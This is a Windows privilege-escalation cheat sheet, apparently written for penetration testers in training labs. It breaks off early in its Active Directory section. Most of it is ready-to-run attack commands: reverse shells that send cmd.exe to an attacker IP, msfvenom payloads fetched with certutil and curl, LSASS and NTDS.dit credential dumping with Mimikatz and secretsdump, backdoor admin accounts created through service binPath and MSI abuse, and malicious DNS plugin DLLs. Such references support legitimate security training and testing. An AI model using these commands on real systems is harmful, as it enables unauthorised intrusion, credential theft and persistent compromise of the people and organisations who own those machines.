# Windows Privilege Escalation — Complete Methodology

> **Workflow:** Enumerate → Identify Attack Surface → Exploit → Escalate → Clean Up  
> Methods are ordered from **most commonly checked** to **most rarely encountered**.

---

## Table of Contents

1. [Initial Enumeration](#1-initial-enumeration)
2. [Credential Hunting](#2-credential-hunting)
3. [Token & Privilege Abuse](#3-token--privilege-abuse)
4. [Service Exploitation](#4-service-exploitation)
5. [UAC Bypass](#5-uac-bypass)
6. [Kernel Exploits](#6-kernel-exploits)
7. [Always Install Elevated](#7-always-install-elevated)
8. [Group-Based Privilege Escalation](#8-group-based-privilege-escalation)
9. [Scheduled Tasks](#9-scheduled-tasks)
10. [Active Directory & Domain Attacks](#10-active-directory--domain-attacks)
11. [Credential Dumping](#11-credential-dumping)
12. [Security Product Enumeration & Bypass](#12-security-product-enumeration--bypass)
13. [File Transfer & LOLBins](#13-file-transfer--lolbins)
14. [Restricted Environment Escape](#14-restricted-environment-escape)
15. [Monitoring & Intelligence Gathering](#15-monitoring--intelligence-gathering)
16. [Rare & Specialized Techniques](#16-rare--specialized-techniques)

---

## 1. Initial Enumeration

> **Always start here.** Rushing to exploit without a complete picture wastes time.

### 1.1 System Information

```powershell
# OS name and version
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

# Architecture
wmic os get osarchitecture
echo %PROCESSOR_ARCHITECTURE%

# Installed hotfixes / patches
wmic qfe
Get-HotFix | ft -AutoSize
```

### 1.2 Current User & Privileges

```powershell
# Who are we?
whoami
echo %USERNAME%
$env:username

# What privileges do we hold?
whoami /priv

# What groups do we belong to?
whoami /groups

# Full token information
whoami /all
```

> **Key privileges to look for:**
> `SeImpersonatePrivilege`, `SeAssignPrimaryTokenPrivilege`, `SeDebugPrivilege`,
> `SeBackupPrivilege`, `SeRestorePrivilege`, `SeTakeOwnershipPrivilege`,
> `SeLoadDriverPrivilege`, `SeTcbPrivilege`

### 1.3 User & Group Enumeration

```powershell
# All local users
net user
Get-LocalUser | ft Name, Enabled, LastLogon
Get-ChildItem C:\Users -Force | select Name

# Details about a specific user
net user administrator
net user %USERNAME%

# Account policy (useful for brute-force planning)
net accounts

# All local groups
net localgroup
Get-LocalGroup | ft Name

# Members of a group
net localgroup administrators
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
Get-LocalGroupMember Administrateurs | ft Name, PrincipalSource   # French OS
```

### 1.4 Running Processes & Services

```powershell
# All processes with owner info
Get-WmiObject -Query "Select * from Win32_Process" | `
  Where-Object {$_.Name -notlike "svchost*"} | `
  Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

# Check which process owns a port
Get-Process -Id (Get-NetTCPConnection -LocalPort 8080).OwningProcess | `
  Select-Object Id, ProcessName, Description, Path

# Services
net start
wmic service list brief
tasklist /SVC
Get-Service

# Processes running as SYSTEM
tasklist /v /fi "username eq system"
```

### 1.5 Installed Programs

```powershell
# WMI method
wmic product get name
Get-WmiObject -Class Win32_Product | select Name, Version

# Registry method (faster and more complete)
$INSTALLED  = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |
              Select-Object DisplayName, DisplayVersion, InstallLocation
$INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* |
              Select-Object DisplayName, DisplayVersion, InstallLocation
$INSTALLED | ? {$_.DisplayName -ne $null} | sort DisplayName -Unique | ft -AutoSize

# Program Files directories
Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent, Name, LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

### 1.6 Network Enumeration

```powershell
# All interfaces, IPs, DNS servers
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias, InterfaceDescription, IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft

# Routing table
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix, NextHop, RouteMetric, ifIndex

# ARP table (discover other live hosts)
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex, IPAddress, LinkLayerAddress, State

# Active connections with PIDs
netstat -ano

# Active connections with process names (auto-enumeration)
Get-NetTCPConnection | ForEach-Object {
    $procName = if ($_.OwningProcess -and (Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue)) {
        (Get-Process -Id $_.OwningProcess).ProcessName
    } else { "Unknown / Closed" }
    [PSCustomObject]@{
        "Local Address"    = "$($_.LocalAddress):$($_.LocalPort)"
        "Remote Address"   = "$($_.RemoteAddress):$($_.RemotePort)"
        "Status"           = $_.State
        "PID"              = $_.OwningProcess
        "Process Name"     = $procName
    }
} | Out-GridView

# Network shares
net share
```

### 1.7 Environment Variables & Drives

```powershell
# Environment variables (can reveal paths, credentials, configs)
set
Get-ChildItem Env: | ft Key, Value

# Logical drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"} | ft Name, Root
```

### 1.8 User Description Fields

> Administrators sometimes store credentials in description fields.

```powershell
Get-LocalUser
Get-WmiObject -Class Win32_OperatingSystem | select Description
```

---

## 2. Credential Hunting

> Credentials in configuration files, registry, and history files are one of the fastest paths to escalation.

### 2.1 PowerShell History

```powershell
# Read current user's history
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadLineOption).HistorySavePath

# Search for passwords specifically
cat (Get-PSReadLineOption).HistorySavePath | sls passw

# All users at once
foreach($user in ((ls C:\users).fullname)){
    cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue
}

# PowerShell transcript files (if transcription is enabled)
# C:\Users\<USERNAME>\Documents\PowerShell_transcript.<HOSTNAME>.<RANDOM>.<TIMESTAMP>.txt
# C:\Transcripts\<DATE>\PowerShell_transcript.<HOSTNAME>.<RANDOM>.<TIMESTAMP>.txt
```

### 2.2 Windows AutoLogon Credentials

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"

# PowerShell alternative
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | `
  Select-Object AutoAdminLogon, DefaultUserName, DefaultPassword
```

### 2.3 Registry Password Search

```powershell
# Broad search
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# Specific known locations
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"            # PuTTY credentials
reg query "HKCU\Software\ORL\WinVNC3\Password"                  # VNC
reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"        # SNMP community string
```

### 2.4 Unattend / Sysprep Files

```powershell
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul

# Common locations
# C:\unattend.xml
# C:\Windows\Panther\Unattend.xml
# C:\Windows\Panther\Unattend\Unattend.xml
# C:\Windows\system32\sysprep.inf
# C:\Windows\system32\sysprep\sysprep.xml
```

### 2.5 Application Configuration Files

```powershell
# General search for password strings
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml

Get-ChildItem -Recurse -Include *.txt,*.ini,*.cfg,*.config,*.xml -ErrorAction SilentlyContinue | `
  Select-String -Pattern "password" | Select-Object Path, LineNumber, Line | Out-GridView

# File name search
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini

# LAPS — search for password strings across common formats
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config 2>nul >> results.txt
```

### 2.6 IIS Web Configuration

```powershell
Get-Childitem -Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
# C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
# C:\inetpub\wwwroot\web.config
```

### 2.7 PowerShell Saved Credentials (PSCredential XML)

```powershell
# An admin may have stored credentials in a PSCredential XML file for automation scripts.
# As the same user, you can decrypt them:
$credential = Import-Clixml -Path 'C:\scripts\pass.xml'
$credential.GetNetworkCredential().username
$credential.GetNetworkCredential().password
```

### 2.8 Cmdkey Saved Credentials

```powershell
# List saved credentials
cmdkey /list

# Use saved credential to run a command as that user
runas /savecred /user:inlanefreight\bob "cmd.exe"
runas /savecred /user:inlanefreight\bob "COMMAND HERE"
```

### 2.9 Windows Credential Manager

```powershell
# Open Credential Manager GUI (useful in restricted environments)
rundll32 keymgr,KRShowKeyMgr
```

### 2.10 Browser Credentials

```powershell
# Chrome — SharpChromium
.\SharpChrome.exe logins /unprotect
Invoke-SharpChromium -Command "cookies slack.com"

# Chrome cookies path
copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies"

# Chrome custom dictionary (users sometimes type passwords here)
gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password

# Firefox cookies path
# C:\Users\<USERNAME>\AppData\Roaming\Mozilla\Firefox\Profiles\<random>.default-release\cookies.sqlite
python3 cookieextractor.py --dbpath "/home/attacker/cookies.sqlite" --host slack --cookie d
```

### 2.11 PuTTY Saved Sessions

```powershell
reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions
reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
```

### 2.12 WiFi Passwords

```powershell
# List saved profiles
netsh wlan show profile

# Reveal password for a specific SSID
netsh wlan show profile <SSID_NAME> key=clear

# Dump all WiFi passwords at once
cls & echo. & for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name=%a key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on
```

### 2.13 Sticky Notes

```powershell
# Sticky Notes SQLite database
# C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite

$db = 'C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite'
Import-Module .\PSSQLite.psd1
Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap

# Linux alternative (after exfiltrating the file)
strings plum.sqlite-wal
```

### 2.14 Password Managers

```powershell
# Find KeePass / 1Password / CyberArk vaults
Get-ChildItem -Path C:\ -Include *.kdbx,*.opvault,*CyberArk* -Recurse -ErrorAction SilentlyContinue | Select-Object FullName

# Crack KeePass master password
python2.7 keepass2john.py ILFREIGHT_Help_Desk.kdbx
hashcat -m 13400 keepass_hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt
```

### 2.15 mRemoteNG Saved Connections

```powershell
# Config file location
# C:\Users\<user>\AppData\Roaming\mRemoteNG\confCons.xml
# Contains base64-encoded encrypted passwords

python3 mremoteng_decrypt.py -s "sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+XlJ+n+KrpZXUTs2rgkml0V9u8NEBMcQ6UnuOdkerig=="
```

### 2.16 All-in-One Credential Harvesting Tools

```powershell
# LaZagne — dumps credentials from 30+ applications
.\lazagne.exe all

# SessionGopher — extracts saved session info (SSH, RDP, WinSCP, FileZilla, PuTTY)
Import-Module .\SessionGopher.ps1
Invoke-SessionGopher -Target WINLPE-SRV01
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

### 2.17 LAPS (Local Administrator Password Solution)

```powershell
# Check if LAPS is deployed
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd"
# Key indicators:
#   AdmPwdEnabled              → LAPS enabled
#   AdminAccountName           → Custom admin account
#   PasswordComplexity         → Password complexity setting
#   PasswordLength             → Password length
#   PwdExpirationProtectionEnabled

# Read LAPS password (requires sufficient permissions)
Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd | Select-Object Name, ms-Mcs-AdmPwd

# Snaffler for automated LAPS/credential discovery
Snaffler.exe -d domain.local -s -v info -o snaffler_results.txt
```

### 2.18 Other Sensitive Files

```powershell
# Classic locations worth checking
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%USERPROFILE%\ntuser.dat
%WINDIR%\System32\drivers\etc\hosts
C:\ProgramData\Configs\*
C:\Program Files\Windows PowerShell\*
dir c:*vnc.ini /s /b
dir c:*ultravnc.ini /s /b

# Alternate Data Streams (ADS) — data hidden inside a file
Get-Item -path flag.txt -Stream *
Get-Content -path flag.txt -Stream <StreamName>
```

---

## 3. Token & Privilege Abuse

> These are some of the most reliable escalation paths when you hold a specific privilege.

### 3.1 Enumerate Held Privileges

```powershell
# Always run as Administrator to see full token
whoami /priv
```

### 3.2 Enabling a Disabled Privilege

```powershell
# Enable a privilege programmatically (PowerShell + P/Invoke)
function Enable-Privilege ([string]$privilegeName) {
    $type = Add-Type -PassThru -TypeName "Win32Privs" -MemberDefinition @'
        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);
        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);
        public struct TOKEN_PRIVILEGES {
            public uint PrivilegeCount;
            public long Luid;
            public uint Attributes;
        }
'@
}

# SeBackupPrivilege — enable via module
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```

### 3.3 SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege

> **Impact:** Escalate to SYSTEM. Very common on IIS/SQL service accounts.

```powershell
# JuicyPotato (Windows Server 2016 / older)
JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
nc -lnvp 8443

# PrintSpoofer (Windows 10 / Server 2019+)
PrintSpoofer.exe -i -c cmd

# GodPotato (universal — Windows Server 2012–2022)
GodPotato.exe -cmd "cmd /c whoami"

# SweetPotato
SweetPotato.exe -a whoami
```

### 3.4 SeDebugPrivilege

> **Impact:** Dump LSASS memory → extract credentials.

```powershell
# Dump lsass with ProcDump
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Task Manager method: Ctrl+Shift+ESC → Details → lsass.exe → Create Dump File

# Parse dump with Mimikatz
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

### 3.5 SeBackupPrivilege

> **Impact:** Read any file regardless of DACL → steal NTDS.dit, SAM, SYSTEM.

```powershell
# Copy any file bypassing ACLs
Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt

# Copy NTDS.dit from a Domain Controller
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit

# Save SAM & SYSTEM hives
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV

# Parse NTDS.dit offline
Import-Module .\DSInternals.psd1
$key = Get-BootKey -SystemHivePath .\SYSTEM
Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=corp,DC=local' -DBPath .\ntds.dit -BootKey $key

secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```

### 3.6 SeTakeOwnershipPrivilege

> **Impact:** Take ownership of any object (files, services, registry keys).

```powershell
# Take ownership of NTDS.dit
takeown /f C:\Windows\NTDS\ntds.dit
icacls C:\Windows\NTDS\ntds.dit /grant %username%:F

# Create VSS shadow copy to copy locked files
vssadmin create shadow /for=C:

# Take ownership of a Security log
takeown /f C:\Windows\System32\Winevt\Logs\Security.evtx
icacls C:\Windows\System32\Winevt\Logs\Security.evtx /grant htb-student:F
```

### 3.7 SeLoadDriverPrivilege

> **Impact:** Load a malicious/vulnerable kernel driver → SYSTEM.

```powershell
# Confirm privilege
whoami /priv  # look for SeLoadDriverPrivilege

# Add registry keys for the vulnerable Capcom driver
reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1

# Compile and run the enabler
cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp
.\EnableSeLoadDriverPrivilege.exe

# Automated — EoPLoadDriver + ExploitCapcom
EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys
.\ExploitCapcom.exe

# Verify driver loaded
.\DriverView.exe /stext drivers.txt
cat drivers.txt | Select-String -pattern Capcom
```

---

## 4. Service Exploitation

### 4.1 Enumerate Potentially Vulnerable Services

```powershell
# SharpUp — automated checks
SharpUp.exe audit

# AccessChk — check service permissions
accesschk.exe /accepteula -ucqv <ServiceName>
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
accesschk.exe /accepteula -uwcqv "Everyone" *

# PsService — more readable output
PsService.exe security <ServiceName>
```

### 4.2 Unquoted Service Path

> **How it works:** If a service binary path contains spaces and is not quoted, Windows searches each path component — dropping a payload in the right directory grants SYSTEM when the service restarts.

```powershell
# Find all unquoted service paths
Get-CimInstance Win32_Service | Where-Object {
    $_.StartMode -eq "Auto" -and
    $_.PathName -notlike '"*' -and
    $_.PathName -like '* *' -and
    $_.PathName -notlike '*C:\Windows\*'
} | Select-Object Name, PathName

# Example vulnerable path:
# C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
# → Windows will try: C:\Program.exe, C:\Program Files.exe, C:\Program Files (x86)\System.exe ...

# Query the service details
sc.exe qc SystemExplorerHelpService

# Create payload matching the exploitable path segment
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.3 LPORT=6666 -f exe > SystemExplorerService64.exe

# Place payload, then restart service
sc.exe stop SystemExplorerHelpService
sc.exe start SystemExplorerHelpService
```

### 4.3 Weak Service Binary Permissions

> **How it works:** If users can overwrite the service binary, replace it with a malicious one.

```powershell
# SharpUp will flag these automatically
SharpUp.exe audit

# Manual check
icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
# Vulnerable if: BUILTIN\Users:(F) or Everyone:(F)

# Create malicious replacement
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.3 LPORT=4444 -f exe > SecurityService.exe
nc -lvnp 4444

# Backup & replace
cd "C:\Program Files (x86)\PCProtect"
move SecurityService.exe SecurityService.exe.bak
Invoke-WebRequest -Uri "http://10.10.14.3:8080/SecurityService.exe" -OutFile ".\SecurityService.exe"

# Restart service
sc.exe stop SecurityService
sc.exe start SecurityService

# Cleanup after obtaining shell
taskkill /F /IM SecurityService.exe
del SecurityService.exe
move SecurityService.exe.bak SecurityService.exe
sc.exe start SecurityService
```

### 4.4 Weak Service Permissions (Configuration Modification)

> **How it works:** If you can change service configuration (not just the binary), redirect the `binPath` to run an arbitrary command.

```powershell
# Check service permissions
accesschk.exe /accepteula -quvcw WindscribeService

# Confirm vulnerability: SERVICE_CHANGE_CONFIG or SERVICE_ALL_ACCESS for current user

# Modify binary path to add a local admin
sc.exe config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"

# Restart service to trigger
sc.exe stop WindscribeService
sc.exe start WindscribeService

# Verify
net localgroup administrators

# Server Operators group example
sc.exe config AppReadiness binPath= "cmd.exe /c net user oxsium AdminPass123! /add && net localgroup Administrators oxsium /add"
sc.exe start AppReadiness
```

### 4.5 Permissive Registry ACLs (Service ImagePath)

> **How it works:** If the service's registry key is writable, change `ImagePath` to your payload.

```powershell
# Find writable service registry keys
accesschk.exe /accepteula -kvuqsw "Users" hklm\System\CurrentControlSet\services
accesschk.exe /accepteula "<USERNAME>" -kvuqsw hklm\System\CurrentControlSet\services
# Look for: KEY_ALL_ACCESS or KEY_SET_VALUE

# Check current ImagePath
Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name ImagePath

# Overwrite with reverse shell command
Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService `
  -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.14.3 443"
```

### 4.6 Modifiable Autorun Binary

> **How it works:** If an autorun entry points to a writable binary, replace it — execute on next admin login.

```powershell
# Enumerate autorun programs
Get-CimInstance Win32_StartupCommand | Select-Object Name, Command, Location, User | Format-List
wmic startup get caption,command
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce

# Check binary permissions
icacls "C:\Program Files (x86)\Windscribe\Windscribe.exe"
# If writable:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8888 -f exe > Windscribe.exe

cd "C:\Program Files (x86)\Windscribe"
move Windscribe.exe Windscribe.exe.bak
certutil -urlcache -f http://10.10.14.3:8080/Windscribe.exe Windscribe.exe

# Wait for admin to log in → shell fires
```

### 4.7 Named Pipe Vulnerabilities

```powershell
# List all named pipes
pipelist.exe /accepteula
gci \\.\pipe\
[System.IO.Directory]::GetFiles("\\.\\pipe\\") | Select-String "SQL"

# Check permissions on a specific pipe
accesschk.exe /accepteula \\.\Pipe\lsass -v

# Check all pipes
accesschk.exe /accepteula \pipe\* -v

# Find writable pipes
accesschk.exe -w \pipe\* -v
# FILE_ALL_ACCESS = full access (dangerous!)
```

---

## 5. UAC Bypass

### 5.1 Check UAC Level

```powershell
# Check current user's integrity level and groups
whoami /groups
# Look for: Administrator AND Medium Integrity Level (bypassable)

# Audit UAC registry settings
$RegPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
$Policies = @("EnableLUA","FilterAdministratorToken","ConsentPromptBehaviorAdmin",
              "ConsentPromptBehaviorUser","PromptOnSecureDesktop","LocalAccountTokenFilterPolicy")
foreach ($p in $Policies) {
    $val = (Get-ItemProperty $RegPath -ErrorAction SilentlyContinue).$p
    Write-Host "$p = $val"
}

reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### 5.2 UAC Bypass via DLL Hijacking (SystemPropertiesAdvanced)

```powershell
# Create malicious DLL
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll > srrstr.dll

# Drop DLL in WindowsApps (user-writable, auto-loaded by SystemPropertiesAdvanced)
curl http://10.10.14.3:8080/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"

# Start listener
nc -lvnp 8443

# Trigger — launches as high integrity
C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
```

### 5.3 Bypass-UAC Module

```powershell
powershell -ep bypass
Import-Module .\Bypass-UAC.ps1
Bypass-UAC -Method UacMethodSysprep
```

---

## 6. Kernel Exploits

> Use as a last resort — kernel exploits are noisy and can crash the system.

### 6.1 Check Patch Level

```powershell
# Installed hotfixes
wmic qfe
Get-HotFix | ft -AutoSize

# Export systeminfo for offline analysis
systeminfo > systeminfo.txt
```

### 6.2 Windows Exploit Suggester — Next Generation (WES-NG)

```powershell
# On attacker machine (after collecting systeminfo.txt)
python3 wes.py systeminfo.txt > exploits.txt
cat exploits.txt | grep Exploit
cat exploits.txt | grep CVE > exploit_CVEs.txt
# https://github.com/bitsadmin/wesng
```

### 6.3 Sherlock (Legacy — PowerShell)

```powershell
Set-ExecutionPolicy bypass -Scope process
Import-Module .\Sherlock.ps1
Find-AllVulns
```

### 6.4 HiveNightmare / SeriousSam (CVE-2021-36934)

> Affects Windows 10 build 1809+ — allows low-privileged users to read SAM/SECURITY/SYSTEM hives.

```powershell
# Check if vulnerable (BUILTIN\Users should NOT have read access on SAM)
icacls C:\Windows\System32\config\SAM
# Vulnerable if: BUILTIN\Users:(I)(RX)

# Exploitation with Mimikatz
mimikatz> token::whoami /full
mimikatz> misc::shadowcopies
mimikatz> lsadump::sam /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /sam:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM
mimikatz> lsadump::secrets /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /security:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY
```

### 6.5 Metasploit Local Exploit Suggester

```powershell
# After obtaining a Meterpreter shell
msf6 > use post/multi/recon/local_exploit_suggester
msf6 > set SESSION 1
msf6 > run
```

---

## 7. Always Install Elevated

> If both HKLM and HKCU keys are set to 1, any user can install MSI packages as SYSTEM.

```powershell
# Check both keys (BOTH must be set to 0x1 to be exploitable)
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# PowerUp confirmation
powershell -ep bypass
Import-Module .\PowerUp.ps1
Get-RegistryAlwaysInstallElevated

# Generate malicious MSI
msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi

# Start listener
nc -lnvp 9443

# Execute MSI as victim
msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart

# PowerUp — add admin user via MSI
Write-UserAddMSI
# Creates backdoor:T3st@123
runas /user:backdoor cmd
```

---

## 8. Group-Based Privilege Escalation

### 8.1 DNS Admins → Code Execution

> Members of **DnsAdmins** can load an arbitrary DLL into the DNS service (runs as SYSTEM).

```powershell
# Generate malicious DLL
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll

# Load DLL as DnsAdmins member
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll

# Check permissions on DNS service
sc.exe sdshow DNS

# Restart DNS to trigger DLL load
Stop-Service -Name "DNS" -Force
Start-Service -Name "DNS"

# Verify escalation
net group "Domain Admins" /dom

# Find user SID for SDDL parsing
(Get-ADUser -Identity "netadm").SID.Value
```

### 8.2 Server Operators → Service Modification

```powershell
# Server Operators can configure and restart services
# Check membership
net localgroup "Server Operators"

# Modify a service the group can control (e.g., AppReadiness)
sc.exe config AppReadiness binPath= "cmd.exe /c net user oxsium AdminPass123! /add && net localgroup Administrators oxsium /add"
sc.exe start AppReadiness

# Dump SAM after gaining admin
reg save HKLM\SAM C:\Tools\sam.hiv
reg save HKLM\SYSTEM C:\Tools\system.hiv
impacket-secretsdump -sam sam.hiv -system system.hiv LOCAL
```

### 8.3 Event Log Readers → Log Access

```powershell
# Check group membership
net localgroup "Event Log Readers"

# Search Security logs for process creation events containing credentials
wevtutil qe Security /rd:true /f:text | Select-String "/user"
wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"

# PowerShell method
Get-WinEvent -LogName security | where {
    $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'
} | Select-Object @{name='CommandLine';expression={$_.Properties[8].Value}}
```

### 8.4 Backup Operators → SAM / NTDS Dump

> Members of **Backup Operators** have `SeBackupPrivilege` and `SeRestorePrivilege` by default.

```powershell
# Enable SeBackupPrivilege
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
Set-SeBackupPrivilege

# Copy NTDS.dit
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
reg save HKLM\SYSTEM SYSTEM.SAV

# Parse offline
secretsdump.py -ntds ntds.dit -system SYSTEM.SAV -hashes lmhash:nthash LOCAL
```

---

## 9. Scheduled Tasks

```powershell
# Enumerate all scheduled tasks
schtasks /query /fo LIST /v
Get-ScheduledTask | select TaskName, State
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName, TaskPath, State

# Find tasks running as SYSTEM or high-privilege accounts
schtasks /query /fo LIST /v > schtasks.txt
cat schtasks.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM

# Check task script/binary for write permissions
.\accesschk64.exe /accepteula -s -d C:\Scripts\

# Task storage directory
# C:\Windows\System32\Tasks
```

---

## 10. Active Directory & Domain Attacks

### 10.1 Domain Controller Enumeration

```powershell
nltest /DCLIST:DomainName
nltest /DCNAME:DomainName
nltest /DSGETDC:DomainName
```

### 10.2 LLMNR / NBT-NS / mDNS Poisoning

> Capture NTLMv2 hashes when users attempt to access non-existent shares.

```bash
# On attacker machine
sudo responder -I eth0 -dwv

# Crack captured hash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

### 10.3 SCF File — Malicious Icon to Capture Hashes

```powershell
# Run Responder first
